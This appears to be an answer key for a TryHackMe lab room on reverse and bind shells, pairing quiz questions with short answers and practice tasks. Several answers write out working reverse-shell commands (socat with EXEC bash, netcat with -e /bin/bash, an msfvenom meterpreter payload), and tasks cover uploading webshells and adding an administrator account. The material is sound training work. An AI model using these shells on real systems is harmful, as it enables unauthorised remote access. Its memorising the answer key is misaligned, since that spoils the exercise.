# What the Shell?

- Read and understand the introduction.

	  no answer needed

- Read the above and check out the links!

	  no answer needed

- Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?

	- `R`

- You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)

	- `N`

- When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?

	- `T`

- Which option tells netcat to listen?

	- `-l`

- How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?

	- `nc 10.10.10.11 8080`

- How would you change your terminal size to have 238 columns?

	- `stty cols 238`

- What is the syntax for setting up a Python3 webserver on port 80?

	- `sudo python3 -m http.server -p 80`

- How would we get socat to listen on TCP port 8080?

	- `TCP-L:8080`

- What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

	- `socat OPENSSL-LISTENER:53,cert=encrypt.pem,verify=0 FILE:'tty',raw,echo=0`

- If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

	- `socat TCP:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

- What command can be used to create a named pipe in Linux?

	- `mkfifo`

- Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself with the languages available.

	  no answer needed

- Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.

	  no answer needed

- Which symbol is used to show that a shell is stageless?

	- `_`

- What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell

	- `msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`

- What command can be used to start a listener in the background?

	- `exploit -j`

- If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?

	- `sessions 10`

- Read the WebShells information.

	  no answer needed

- Read the above information

	  no answer needed

- Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.

	  no answer needed	

- Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

	  no answer needed

- Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

	  no answer needed

- Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

	  no answer needed

- Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.

	  no answer needed

- Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

	  no answer needed

- Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

	  no answer needed

- The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

	  no answer needed

- Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

	  no answer needed

- Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

	  no answer needed

- Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?

	  no answer needed

- No Answer Required

	  no answer needed

- No answer required

	  no answer needed


